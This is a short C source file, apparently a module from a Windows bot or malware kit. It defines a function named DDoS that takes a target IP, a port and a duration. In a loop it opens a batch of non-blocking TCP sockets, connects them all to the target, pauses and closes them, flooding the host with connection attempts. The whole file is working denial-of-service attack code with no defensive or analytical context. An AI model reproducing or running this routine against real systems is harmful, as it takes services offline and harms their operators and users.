#include "../Base.h"

void DDoS(char *noob, char *port, char *time4)
{
	unsigned short p = (unsigned short)atoi(port);
	int t = atoi(time4);
	int SynDelay = 100;
	SOCKADDR_IN    SockAddr;
	SOCKET         btSock[DDoS_SOCKETS];
   	IN_ADDR iaddr;
	memset(&SockAddr, 0, sizeof(SockAddr));
	SockAddr.sin_family = AF_INET;
   	SockAddr.sin_port = htons(p);
	LPHOSTENT lpHostEntry = NULL;
 	DWORD mode = 1;
	int c,i;
	iaddr.s_addr = inet_addr(noob);
	SockAddr.sin_addr = iaddr;
	i = 0;
	while (i < t) {
		for (c=0;c<DDoS_SOCKETS;c++)
		{
			btSock[c] = socket(AF_INET, SOCK_STREAM, 0);
   			if (btSock[c] == INVALID_SOCKET)
      				continue;
			ioctlsocket(btSock[c],FIONBIO,&mode);
		}
		for (c=0;c<DDoS_SOCKETS;c++)
  			connect(btSock[c], (PSOCKADDR) &SockAddr, sizeof(SockAddr));
      		Sleep(SynDelay);     
		for (c=0;c<DDoS_SOCKETS;c++)
			closesocket(btSock[c]);
		i++;
	}
}
